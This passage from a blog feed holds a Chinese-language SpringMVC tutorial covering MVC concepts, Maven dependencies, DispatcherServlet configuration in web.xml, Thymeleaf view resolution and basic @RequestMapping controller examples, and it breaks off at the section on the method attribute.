        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三、SpringMVC</title>
      <link href="/2023/04/21/Java/%E4%B8%89%E3%80%81SpringMVC/"/>
      <url>/2023/04/21/Java/%E4%B8%89%E3%80%81SpringMVC/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="三、SpringMVC"><a href="#三、SpringMVC" class="headerlink" title="三、SpringMVC"></a>三、SpringMVC</h1><h2 id="1、SpringMVC简介"><a href="#1、SpringMVC简介" class="headerlink" title="1、SpringMVC简介"></a>1、SpringMVC简介</h2><h3 id="1-1、什么是MVC"><a href="#1-1、什么是MVC" class="headerlink" title="1.1、什么是MVC"></a>1.1、什么是MVC</h3><p>MVC是一种软件架构的思想，将软件按照模型、视图、控制器来划分</p><p>M：Model，模型层，指工程中的JavaBean，作用是处理数据</p><p>JavaBean分为两类：</p><ul><li>一类称为实体类Bean：专门存储业务数据的，如 Student、User 等</li><li>一类称为业务处理 Bean：指 Service 或 Dao 对象，专门用于处理业务逻辑和数据访问。</li></ul><p>V：View，视图层，指工程中的html或jsp等页面，作用是与用户进行交互，展示数据</p><p>C：Controller，控制层，指工程中的servlet，作用是接收请求和响应浏览器</p><p>MVC的工作流程： 用户通过视图层发送请求到服务器，在服务器中请求被Controller接收，Controller</p><p>调用相应的Model层处理请求，处理完毕将结果返回到Controller，Controller再根据请求处理的结果</p><p>找到相应的View视图，渲染数据后最终响应给浏览器</p><h2 id="1-2、什么是SpringMVC"><a href="#1-2、什么是SpringMVC" class="headerlink" title="1.2、什么是SpringMVC"></a>1.2、什么是SpringMVC</h2><p>SpringMVC是Spring的一个后续产品，是Spring的一个子项目</p><p>SpringMVC 是 Spring 为表述层开发提供的一整套完备的解决方案。在表述层框架历经 Strust、</p><p>WebWork、Strust2 等诸多产品的历代更迭之后，目前业界普遍选择了 SpringMVC 作为 Java EE 项目</p><p>表述层开发的<strong>首选方案</strong>。</p><blockquote><p>注：三层架构分为表述层（或表示层）、业务逻辑层、数据访问层，表述层表示前台页面和后台</p><p>servlet</p></blockquote><h2 id="1-3、SpringMVC的特点"><a href="#1-3、SpringMVC的特点" class="headerlink" title="1.3、SpringMVC的特点"></a>1.3、SpringMVC的特点</h2><ul><li><strong>Spring</strong> <strong>家族原生产品</strong>，与 IOC 容器等基础设施无缝对接</li><li><strong>基于原生的Servlet</strong>，通过了功能强大的<strong>前端控制器DispatcherServlet</strong>，对请求和响应进行统一</li></ul><p>处理</p><ul><li>表述层各细分领域需要解决的问题<strong>全方位覆盖</strong>，提供<strong>全面解决方案</strong></li><li><strong>代码清新简洁</strong>，大幅度提升开发效率</li><li>内部组件化程度高，可插拔式组件<strong>即插即用</strong>，想要什么功能配置相应组件即可</li><li><strong>性能卓著</strong>，尤其适合现代大型、超大型互联网项目要求</li></ul><h1 id="2、入门案例"><a href="#2、入门案例" class="headerlink" title="2、入门案例"></a>2、入门案例</h1><h2 id="2-1、开发环境"><a href="#2-1、开发环境" class="headerlink" title="2.1、开发环境"></a>2.1、开发环境</h2><p>IDE：idea 2019.2</p><p>构建工具：maven3.5.4</p><p>服务器：tomcat8.5</p><p>Spring版本：5.3.1</p><h2 id="2-2、创建maven工程"><a href="#2-2、创建maven工程" class="headerlink" title="2.2、创建maven工程"></a>2.2、创建maven工程</h2><h3 id="①添加web模块"><a href="#①添加web模块" class="headerlink" title="①添加web模块"></a>①添加web模块</h3><h3 id="②打包方式：war"><a href="#②打包方式：war" class="headerlink" title="②打包方式：war"></a>②打包方式：war</h3><h3 id="③引入依赖"><a href="#③引入依赖" class="headerlink" title="③引入依赖"></a>③引入依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- SpringMVC --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 日志 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ServletAPI --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring5和Thymeleaf整合包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.thymeleaf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>thymeleaf-spring5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注：由于 Maven 的传递性，我们不必将所有需要的包全部配置依赖，而是配置最顶端的依赖，其他靠</p><p>传递性导入。</p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm//29.png" alt="29"></p><h2 id="2-3、配置web-xml"><a href="#2-3、配置web-xml" class="headerlink" title="2.3、配置web.xml"></a>2.3、配置web.xml</h2><p>注册SpringMVC的前端控制器DispatcherServlet</p><h3 id="①默认配置方式"><a href="#①默认配置方式" class="headerlink" title="①默认配置方式"></a>①默认配置方式</h3><p>此配置作用下，SpringMVC的配置文件默认位于WEB-INF下，默认名称为<servlet-name>-</p><p>servlet.xml，例如，以下配置所对应SpringMVC的配置文件位于WEB-INF下，文件名为springMVC</p><p>servlet.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置SpringMVC的前端控制器，对浏览器发送的请求统一进行处理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet&lt;/servletclass&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        设置springMVC的核心控制器所能处理的请求的请求路径</span></span><br><span class="line"><span class="comment">        /所匹配的请求可以是/login或.html或.js或.css方式的请求路径</span></span><br><span class="line"><span class="comment">        但是/不能匹配.jsp请求路径的请求</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="②扩展配置方式"><a href="#②扩展配置方式" class="headerlink" title="②扩展配置方式"></a>②扩展配置方式</h3><p>可通过init-param标签设置SpringMVC配置文件的位置和名称，通过load-on-startup标签设置</p><p>SpringMVC前端控制器DispatcherServlet的初始化时间</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置SpringMVC的前端控制器，对浏览器发送的请求统一进行处理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet&lt;/servletclass&gt;</span><br><span class="line">    <span class="comment">&lt;!-- 通过初始化参数指定SpringMVC配置文件的位置和名称 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- contextConfigLocation为固定值 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 使用classpath:表示从类路径查找配置文件，例如maven工程中的src/main/resources --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springMVC.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        作为框架的核心组件，在启动过程中有大量的初始化操作要做</span></span><br><span class="line"><span class="comment">        而这些操作放在第一次请求时才执行会严重影响访问速度</span></span><br><span class="line"><span class="comment">        因此需要通过此标签将启动控制DispatcherServlet的初始化时间提前到服务器启动时</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        设置springMVC的核心控制器所能处理的请求的请求路径</span></span><br><span class="line"><span class="comment">        /所匹配的请求可以是/login或.html或.js或.css方式的请求路径</span></span><br><span class="line"><span class="comment">        但是/不能匹配.jsp请求路径的请求</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注：</p><p><url-pattern>标签中使用&#x2F;和&#x2F;*的区别：</p><p>&#x2F;所匹配的请求可以是&#x2F;login或.html或.js或.css方式的请求路径，但是&#x2F;不能匹配.jsp请求路径的请</p><p>求</p><p>因此就可以避免在访问jsp页面时，该请求被DispatcherServlet处理，从而找不到相应的页面</p><p>&#x2F;*则能够匹配所有请求，例如在使用过滤器时，若需要对所有请求进行过滤，就需要使用&#x2F;*的写</p><p>法</p></blockquote><h2 id="2-4、创建请求控制器"><a href="#2-4、创建请求控制器" class="headerlink" title="2.4、创建请求控制器"></a>2.4、创建请求控制器</h2><p>由于前端控制器对浏览器发送的请求进行了统一的处理，但是具体的请求有不同的处理过程，因此需要创建处理具体请求的类，即请求控制器</p><p>请求控制器中每一个处理请求的方法成为控制器方法</p><p>因为SpringMVC的控制器由一个POJO（普通的Java类）担任，因此需要通过@Controller注解将其标识为一个控制层组件，交给Spring的IoC容器管理，此时SpringMVC才能够识别控制器的存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5、创建SpringMVC的配置文件"><a href="#2-5、创建SpringMVC的配置文件" class="headerlink" title="2.5、创建SpringMVC的配置文件"></a>2.5、创建SpringMVC的配置文件</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 自动扫描包 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.atguigu.mvc.controller&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置Thymeleaf视图解析器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;viewResolver&quot;</span><span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring5.view.ThymeleafViewResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;order&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;characterEncoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateEngine&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring5.SpringTemplateEngine&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateResolver&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bean</span></span></span><br><span class="line"><span class="tag">                      <span class="attr">class</span>=<span class="string">&quot;org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver&quot;</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 视图前缀 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/templates/&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 视图后缀 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.html&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;templateMode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;HTML5&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;characterEncoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    处理静态资源，例如html、js、css、jpg</span></span><br><span class="line"><span class="comment">    若只设置该标签，则只能访问静态资源，其他请求则无法访问</span></span><br><span class="line"><span class="comment">    此时必须设置&lt;mvc:annotation-driven/&gt;解决问题</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 开启mvc注解驱动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 处理响应中文内容乱码 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span></span></span><br><span class="line"><span class="tag">              <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;defaultCharset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;supportedMediaTypes&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">value</span>&gt;</span>text/html<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">value</span>&gt;</span>application/json<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mvc:message-converters</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-6、测试HelloWorld"><a href="#2-6、测试HelloWorld" class="headerlink" title="2.6、测试HelloWorld"></a>2.6、测试HelloWorld</h2><h3 id="①实现对首页的访问"><a href="#①实现对首页的访问" class="headerlink" title="①实现对首页的访问"></a>①实现对首页的访问</h3><p>在请求控制器中创建处理请求的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @RequestMapping注解：处理请求和控制器方法之间的映射关系</span></span><br><span class="line"><span class="comment">// @RequestMapping注解的value属性可以通过请求地址匹配请求，/表示的当前工程的上下文路径</span></span><br><span class="line"><span class="comment">// localhost:8080/springMVC/</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//设置视图名称</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="②通过超链接跳转到指定页面"><a href="#②通过超链接跳转到指定页面" class="headerlink" title="②通过超链接跳转到指定页面"></a>②通过超链接跳转到指定页面</h3><p>在主页index.html中设置超链接</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/hello&#125;&quot;</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在请求控制器中创建处理请求的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">HelloWorld</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;target&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-7、总结"><a href="#2-7、总结" class="headerlink" title="2.7、总结"></a>2.7、总结</h2><p>浏览器发送请求，若请求地址符合前端控制器的url-pattern，该请求就会被前端控制器DispatcherServlet处理。前端控制器会读取SpringMVC的核心配置文件，通过扫描组件找到控制器，</p><p>将请求地址和控制器中@RequestMapping注解的value属性值进行匹配，若匹配成功，该注解所标识的控制器方法就是处理请求的方法。处理请求的方法需要返回一个字符串类型的视图名称，该视图名称会被视图解析器解析，加上前缀和后缀组成视图的路径，通过Thymeleaf对视图进行渲染，最终转发到视图所对应页面</p><h1 id="3、-RequestMapping注解"><a href="#3、-RequestMapping注解" class="headerlink" title="3、@RequestMapping注解"></a>3、@RequestMapping注解</h1><h2 id="3-1、-RequestMapping注解的功能"><a href="#3-1、-RequestMapping注解的功能" class="headerlink" title="3.1、@RequestMapping注解的功能"></a>3.1、@RequestMapping注解的功能</h2><p>从注解名称上我们可以看到，@RequestMapping注解的作用就是将请求和处理请求的控制器方法关联起来，建立映射关系。</p><p>SpringMVC 接收到指定的请求，就会来找到在映射关系中对应的控制器方法来处理这个请求。</p><h2 id="3-2、-RequestMapping注解的位置"><a href="#3-2、-RequestMapping注解的位置" class="headerlink" title="3.2、@RequestMapping注解的位置"></a>3.2、@RequestMapping注解的位置</h2><p>@RequestMapping标识一个类：设置映射请求的请求路径的初始信息</p><p>@RequestMapping标识一个方法：设置映射请求请求路径的具体信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestMappingController</span> &#123;</span><br><span class="line">    <span class="comment">//此时请求映射所映射的请求的请求路径为：/test/testRequestMapping</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/testRequestMapping&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">testRequestMapping</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.3、@RequestMapping注解的value属性</p><p>@RequestMapping注解的value属性通过请求的请求地址匹配请求映射</p><p>@RequestMapping注解的value属性是一个字符串类型的数组，表示该请求映射能够匹配多个请求地址所对应的请求</p><p>@RequestMapping注解的value属性必须设置，至少通过请求地址匹配请求映射</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/testRequestMapping&#125;&quot;</span>&gt;</span>测试@RequestMapping的value属性--</span><br><span class="line">&gt;/testRequestMapping<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/test&#125;&quot;</span>&gt;</span>测试@RequestMapping的value属性--&gt;/test<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(</span></span><br><span class="line"><span class="meta">    value = &#123;&quot;/testRequestMapping&quot;, &quot;/test&quot;&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testRequestMapping</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-4、-RequestMapping注解的method属性"><a href="#3-4、-RequestMapping注解的method属性" class="headerlink" 